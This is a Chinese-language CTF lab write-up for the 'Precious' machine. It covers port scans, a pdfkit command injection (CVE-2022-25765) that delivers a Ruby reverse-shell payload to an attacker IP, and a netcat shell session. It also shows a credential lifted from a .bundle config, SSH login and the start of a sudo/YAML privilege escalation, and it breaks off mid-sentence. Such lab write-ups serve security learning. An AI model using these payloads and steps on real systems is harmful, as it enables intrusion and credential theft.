    <content type="html"><![CDATA[<h1 id="Precious-靶机"><a href="#Precious-靶机" class="headerlink" title="Precious 靶机"></a>Precious 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/precious]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.129   <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-30 10:32 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.129<br>Host is up (0.00010s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 00:0C:29:2F:D8:2A (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.96 seconds<br></code></pre></td></tr></table></figure><p>只开放了 22 和 80 两个端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 192.1.1.129                                  <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-30 10:33 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.129<br>Host is up (0.00041s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 b1:54:4d:49:a6:1c:09:a4:ac:20:ea:15:6d:f4:9e:7b (RSA)<br>|   256 43:3c:c8:<span class="hljs-built_in">cd</span>:0e:bc:d8:d1:92:c4:1a:40:4c:5e:3e:93 (ECDSA)<br>|_  256 6c:6d:c7:c8:4c:3b:01:b5:ea:59:bb:da:7f:fd:bb:c5 (ED25519)<br>80/tcp open  http    nginx 1.18.0 (Ubuntu)<br>|_http-title: Did not follow redirect to http://precious.htb/<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>MAC Address: 00:0C:29:2F:D8:2A (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 4.15 - 5.8 (99%), Linux 5.0 - 5.5 (98%), Linux 5.0 - 5.4 (97%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 5.4 (96%), Linux 2.6.32 (96%), Linux 5.3 - 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 16.43 seconds<br></code></pre></td></tr></table></figure><p>80 端口重定向到了 <code>precious.htb</code>，将其和 IP 地址的映射写入 <code>/etc/hosts</code> 文件，之后再通过浏览器访问。看一看 udp 扫描的结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/precious]<br>└─$ sudo nmap --top-ports 20 -sU 192.1.1.129   <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-30 10:33 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.129<br>Host is up (0.0025s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   closed        snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   closed        ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 00:0C:29:2F:D8:2A (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 27.71 seconds<br></code></pre></td></tr></table></figure><p>基本都是关闭状态，nmap 漏洞脚本扫描一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/precious]<br>└─$ sudo nmap --script=vuln -p22,80 192.1.1.129                                  <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-30 10:38 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> precious.htb (192.1.1.129)<br>Host is up (0.00032s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=precious.htb<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: http://precious.htb:80/<br>|     Form <span class="hljs-built_in">id</span>: <br>|_    Form action: /<br>MAC Address: 00:0C:29:2F:D8:2A (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 73.89 seconds<br></code></pre></td></tr></table></figure><h2 id="Web-服务查看"><a href="#Web-服务查看" class="headerlink" title="Web 服务查看"></a>Web 服务查看</h2><p>打开 <code>precious.htb</code> </p><p><img src="/pic/9894037a370b483e05d2acad99431f13_MD5.png"></p><p>是一个将 Web 网页转变成 PDF 的在线网站，将 <code>https://www.baidu.com</code> 和 <code>http://precious.htb</code> 分别放进去试试</p><p><img src="/pic/71ce06ade344c6061fdcde094671c470_MD5.png"></p><p>得到一个 PDF，看起来没什么信息</p><h2 id="pdfkit-漏洞"><a href="#pdfkit-漏洞" class="headerlink" title="pdfkit 漏洞"></a>pdfkit 漏洞</h2><p>将其下载到本地查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/precious]<br>└─$ <span class="hljs-built_in">ls</span>                     <br>id23dsowsjm4unj3et1rtntqcdii70py.pdf<br><br>┌──(kali㉿kali)-[~/Downloads/precious]<br>└─$ file id23dsowsjm4unj3et1rtntqcdii70py.pdf <br>id23dsowsjm4unj3et1rtntqcdii70py.pdf: PDF document, version 1.4, 1 pages<br><br>┌──(kali㉿kali)-[~/Downloads/precious]<br>└─$ exiftool id23dsowsjm4unj3et1rtntqcdii70py.pdf <br>ExifTool Version Number         : 12.57<br>File Name                       : id23dsowsjm4unj3et1rtntqcdii70py.pdf<br>Directory                       : .<br>File Size                       : 24 kB<br>File Modification Date/Time     : 2023:06:30 10:36:14-04:00<br>File Access Date/Time           : 2023:06:30 10:36:42-04:00<br>File Inode Change Date/Time     : 2023:06:30 10:36:14-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : PDF<br>File Type Extension             : pdf<br>MIME Type                       : application/pdf<br>PDF Version                     : 1.4<br>Linearized                      : No<br>Page Count                      : 1<br>Creator                         : Generated by pdfkit v0.8.6<br></code></pre></td></tr></table></figure><p>发现这个 PDF 文件是由 pdfkit 创建的，这或许是个突破点？看看有没有相关的漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ searchsploit pdfkit    <br>---------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                    |  Path<br>---------------------------------------------------------------------------------- ---------------------------------<br>pdfkit v0.8.7.2 - Command Injection                                               | ruby/local/51293.py<br>---------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>的确有个脚本，受影响的版本比靶机上的程序还要新，下载到本地看看如何运行这个脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/precious]<br>└─$ searchsploit -m 51293<br>  Exploit: pdfkit v0.8.7.2 - Command Injection<br>      URL: https://www.exploit-db.com/exploits/51293<br>     Path: /usr/share/exploitdb/exploits/ruby/local/51293.py<br>    Codes: CVE-2022–25765<br> Verified: True<br>File Type: Python script, Unicode text, UTF-8 text executable<br>Copied to: /home/kali/Downloads/precious/51293.py<br><br>┌──(kali㉿kali)-[~/Downloads/precious]<br>└─$ python3 51293.py -h                                       <br>UNICORD Exploit <span class="hljs-keyword">for</span> CVE-2022–25765 (pdfkit) - Command Injection<br><br>Usage:<br>  python3 exploit-CVE-2022–25765.py -c &lt;<span class="hljs-built_in">command</span>&gt;<br>  python3 exploit-CVE-2022–25765.py -s &lt;local-IP&gt; &lt;local-port&gt;<br>  python3 exploit-CVE-2022–25765.py -c &lt;<span class="hljs-built_in">command</span>&gt; [-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;]<br>  python3 exploit-CVE-2022–25765.py -s &lt;local-IP&gt; &lt;local-port&gt; [-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;]<br>  python3 exploit-CVE-2022–25765.py -h<br><br>Options:<br>  -c    Custom <span class="hljs-built_in">command</span> mode. Provide <span class="hljs-built_in">command</span> to generate custom payload with.<br>  -s    Reverse shell mode. Provide <span class="hljs-built_in">local</span> IP and port to generate reverse shell payload with.<br>  -w    URL of website running vulnerable pdfkit. (Optional)<br>  -p    POST parameter on website running vulnerable pdfkit. (Optional)<br>  -h    Show this <span class="hljs-built_in">help</span> menu.<br></code></pre></td></tr></table></figure><p>可以看到给出了反弹 shell 的例子，我们提取开启监听，尝试反弹 shell。注意这里 post 体表单参数名叫 <code>url</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/precious]<br>└─$ python3 51293.py -s 192.1.1.128 443 -w http://precious.htb/ -p url<br><br>        _ __,~~~/_        __  ___  _______________  ___  ___<br>    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \<br>        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /<br>_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....<br>    <br>UNICORD: Exploit <span class="hljs-keyword">for</span> CVE-2022–25765 (pdfkit) - Command Injection<br>OPTIONS: Reverse Shell Sent to Target Website Mode<br>PAYLOAD: http://%20`ruby -rsocket -e<span class="hljs-string">&#x27;spawn(&quot;sh&quot;,[:in,:out,:err]=&gt;TCPSocket.new(&quot;192.1.1.128&quot;,&quot;443&quot;))&#x27;</span>`<br>LOCALIP: 192.1.1.128:443<br>WARNING: Be sure to start a <span class="hljs-built_in">local</span> listener on the above IP and port. <span class="hljs-string">&quot;nc -lnvp 443&quot;</span>.<br>WEBSITE: http://precious.htb/<br>POSTARG: url<br>EXPLOIT: Payload sent to website!<br>SUCCESS: Exploit performed action.<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/precious]<br>└─$ sudo nc -lvnp 443                                                             <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.1.1.128] from (UNKNOWN) [192.1.1.129] 41312<br><span class="hljs-built_in">whoami</span><br>ruby<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:2f:d8:2a brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.129/24 brd 192.1.1.255 scope global dynamic ens33<br>       valid_lft 937sec preferred_lft 937sec<br>    inet6 fe80::20c:29ff:fe2f:d82a/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br><span class="hljs-built_in">uname</span> -a<br>Linux precious 5.4.0-150-generic <span class="hljs-comment">#167-Ubuntu SMP Mon May 15 17:35:05 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-built_in">which</span> python<br><span class="hljs-built_in">which</span> python2<br><span class="hljs-built_in">which</span> python3<br>/usr/bin/python3<br>python3 -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>ruby@precious:/var/www/pdfapp$ <br></code></pre></td></tr></table></figure><h2 id="bundle隐藏文件"><a href="#bundle隐藏文件" class="headerlink" title=".bundle隐藏文件"></a>.bundle隐藏文件</h2><p>完善 shell 后，进行信息收集，看一看有哪些用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby@precious:/var/www/pdfapp$ <span class="hljs-built_in">cat</span> /etc/passwd | grep bash<br><span class="hljs-built_in">cat</span> /etc/passwd | grep bash<br>root:x:0:0:root:/root:/bin/bash<br>gaoxiaodiao:x:1000:1000:gaoxiaodiao:/home/gaoxiaodiao:/bin/bash<br>ruby:x:1001:1001:,,,:/home/ruby:/bin/bash<br>henry:x:1002:1002:,,,:/home/henry:/bin/bash<br></code></pre></td></tr></table></figure><p>比想象中多，那按照一般的逻辑来看，应该是先进行用户的切换再进行提权操作，继续信息收集吧，进入家目录看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby@precious:~$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 28K<br>393257 drwxr-xr-x 4 ruby ruby 4.0K Jun 12 04:23 .<br>393218 drwxr-xr-x 5 root root 4.0K Jun 12 04:23 ..<br>393274 lrwxrwxrwx 1 ruby ruby    9 Jun 12 04:23 .bash_history -&gt; /dev/null<br>393258 -rw-r--r-- 1 ruby ruby  220 Jun 12 04:23 .bash_logout<br>393259 -rw-r--r-- 1 ruby ruby 3.7K Jun 12 04:23 .bashrc<br>393254 dr-xr-xr-x 2 ruby ruby 4.0K Jun 12 04:23 .bundle<br>393267 drwxr-xr-x 4 ruby ruby 4.0K Jun 30 14:35 .cache<br>393260 -rw-r--r-- 1 ruby ruby  807 Jun 12 04:23 .profile<br></code></pre></td></tr></table></figure><p>家目录中有两个隐藏文件夹 <code>.bundle</code> 和 <code>.bundle</code>，进去看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby@precious:~$ <span class="hljs-built_in">cd</span> .bundle<br><span class="hljs-built_in">cd</span> .bundle<br>ruby@precious:~/.bundle$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 12K<br>393254 dr-xr-xr-x 2 ruby ruby 4.0K Jun 12 04:23 .<br>393257 drwxr-xr-x 4 ruby ruby 4.0K Jun 12 04:23 ..<br>393266 -r-xr-xr-x 1 ruby ruby   62 Jun 12 04:23 config<br>ruby@precious:~/.bundle$ <span class="hljs-built_in">cat</span> config<br><span class="hljs-built_in">cat</span> config<br>---<br>BUNDLE_HTTPS://RUBYGEMS__ORG/: <span class="hljs-string">&quot;henry:Q3c1AqGHtoI0aXAYFH&quot;</span><br></code></pre></td></tr></table></figure><p>竟然在这里找到了用户名和密码，那就 ssh 登录吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/precious]<br>└─$ ssh henry@192.1.1.129   <br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @<br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!<br>Someone could be eavesdropping on you right now (man-in-the-middle attack)!<br>It is also possible that a host key has just been changed.<br>The fingerprint <span class="hljs-keyword">for</span> the ED25519 key sent by the remote host is<br>SHA256:hhZ2PP71pBNZ2j6slM0FYVNYiySWo+MZtY1HNrglpHs.<br>Please contact your system administrator.<br>Add correct host key <span class="hljs-keyword">in</span> /home/kali/.ssh/known_hosts to get rid of this message.<br>Offending ECDSA key <span class="hljs-keyword">in</span> /home/kali/.ssh/known_hosts:10<br>  remove with:<br>  ssh-keygen -f <span class="hljs-string">&quot;/home/kali/.ssh/known_hosts&quot;</span> -R <span class="hljs-string">&quot;192.1.1.129&quot;</span><br>Host key <span class="hljs-keyword">for</span> 192.1.1.129 has changed and you have requested strict checking.<br>Host key verification failed.<br></code></pre></td></tr></table></figure><p>遇到了个小问题，因为是本地环境，导致 know_hosts 文件中有这个 IP 的历史记录（别的机器），按照上面的提示，使用 <code>ssh-keygen -f &quot;/home/kali/.ssh/known_hosts&quot; -R &quot;192.1.1.129&quot;</code> 命令就好</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/precious]<br>└─$ ssh-keygen -f <span class="hljs-string">&quot;/home/kali/.ssh/known_hosts&quot;</span> -R <span class="hljs-string">&quot;192.1.1.129&quot;</span><br><span class="hljs-comment"># Host 192.1.1.129 found: line 8</span><br><span class="hljs-comment"># Host 192.1.1.129 found: line 9</span><br><span class="hljs-comment"># Host 192.1.1.129 found: line 10</span><br>/home/kali/.ssh/known_hosts updated.<br>Original contents retained as /home/kali/.ssh/known_hosts.old<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/precious]<br>└─$ ssh henry@192.1.1.129                                       <br>The authenticity of host <span class="hljs-string">&#x27;192.1.1.129 (192.1.1.129)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:hhZ2PP71pBNZ2j6slM0FYVNYiySWo+MZtY1HNrglpHs.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.1.1.129<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">Last login: Mon Jun 12 05:13:05 2023 from 192.168.42.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">henry@precious:~$ whoami</span><br><span class="hljs-string">henry</span><br><span class="hljs-string">henry@precious:~$ ls -liah</span><br><span class="hljs-string">total 36K</span><br><span class="hljs-string">393261 drwxr-xr-x 5 henry henry 4.0K Jun 12 05:10 .</span><br><span class="hljs-string">393218 drwxr-xr-x 5 root  root  4.0K Jun 12 04:23 ..</span><br><span class="hljs-string">393279 lrwxrwxrwx 1 henry henry    9 Jun 12 04:23 .bash_history -&gt; /dev/null</span><br><span class="hljs-string">393262 -rw-r--r-- 1 henry henry  220 Jun 12 04:23 .bash_logout</span><br><span class="hljs-string">393263 -rw-r--r-- 1 henry henry 3.9K Jun 12 05:07 .bashrc</span><br><span class="hljs-string">393611 drwx------ 2 henry henry 4.0K Jun 12 05:08 .cache</span><br><span class="hljs-string">393544 drwx------ 3 henry henry 4.0K Jun 12 04:56 .config</span><br><span class="hljs-string">393275 drwxr-xr-x 3 henry henry 4.0K Jun 12 04:23 .local</span><br><span class="hljs-string">393264 -rw-r--r-- 1 henry henry  807 Jun 12 04:23 .profile</span><br><span class="hljs-string">393612 -rw-r----- 1 henry henry  536 Jun 12 05:01 user.txt</span><br><span class="hljs-string">393615 lrwxrwxrwx 1 henry henry    9 Jun 12 05:10 .viminfo -&gt; /dev/null</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>找到了 <code>user.txt</code>，查看 <code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">henry@precious:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> henry on precious:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User henry may run the following commands on precious:<br>    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb<br></code></pre></td></tr></table></figure><p><code>sudo -l</code> 竟然有收获，看一看这个文件吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">henry@precious:~$ <span class="hljs-built_in">ls</span> -liah /opt/update_dependencies.rb<br>210617 -rwxr-xr-x 1 root root 848 Jun 12 04:23 /opt/update_dependencies.rb<br>henry@precious:~$ <span class="hljs-built_in">cat</span> /opt/update_dependencies.rb<br><span class="hljs-comment"># Compare installed dependencies with those specified in &quot;dependencies.yml&quot;</span><br>require <span class="hljs-string">&quot;yaml&quot;</span><br>require <span class="hljs-string">&#x27;rubygems&#x27;</span><br><br><span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> update versions automatically</span><br>def update_gems()<br>end<br><br>def list_from_file<br>    YAML.load(File.<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;dependencies.yml&quot;</span>))<br>end<br><br>def list_local_gems<br>    Gem::Specification.sort_by&#123; |g| [g.name.downcase, g.version] &#125;.map&#123;|g| [g.name, g.version.to_s]&#125;<br>end<br><br>gems_file = list_from_file<br>gems_local = list_local_gems<br><br>gems_file.each <span class="hljs-keyword">do</span> |file_name, file_version|<br>    gems_local.each <span class="hljs-keyword">do</span> |local_name, local_version|<br>        <span class="hljs-keyword">if</span>(file_name == local_name)<br>            <span class="hljs-keyword">if</span>(file_version != local_version)<br>                puts <span class="hljs-string">&quot;Installed version differs from the one specified in file: &quot;</span> + local_name<br>            <span class="hljs-keyword">else</span><br>                puts <span class="hljs-string">&quot;Installed version is equals to the one specified in file: &quot;</span> + local_name<br>            end<br>        end<br>    end<br>end<br></code></pre></td></tr></table></figure><p>看起来我可以无密码 sudo 直接使用来使用 